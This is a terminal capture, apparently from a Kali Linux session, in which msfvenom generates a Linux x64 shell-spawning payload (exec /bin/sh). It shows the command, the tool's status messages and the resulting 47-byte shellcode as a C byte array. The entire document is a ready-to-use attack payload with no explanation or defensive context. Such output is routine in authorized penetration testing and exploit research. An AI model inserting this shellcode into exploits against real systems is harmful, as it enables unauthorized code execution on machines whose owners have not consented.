root@kali:~# msfvenom -p linux/x64/exec -f c CMD=/bin/sh
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 47 bytes
Final size of c file: 224 bytes
unsigned char buf[] = 
"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x08\x00"
"\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x48\x89\xe6"
"\x0f\x05";

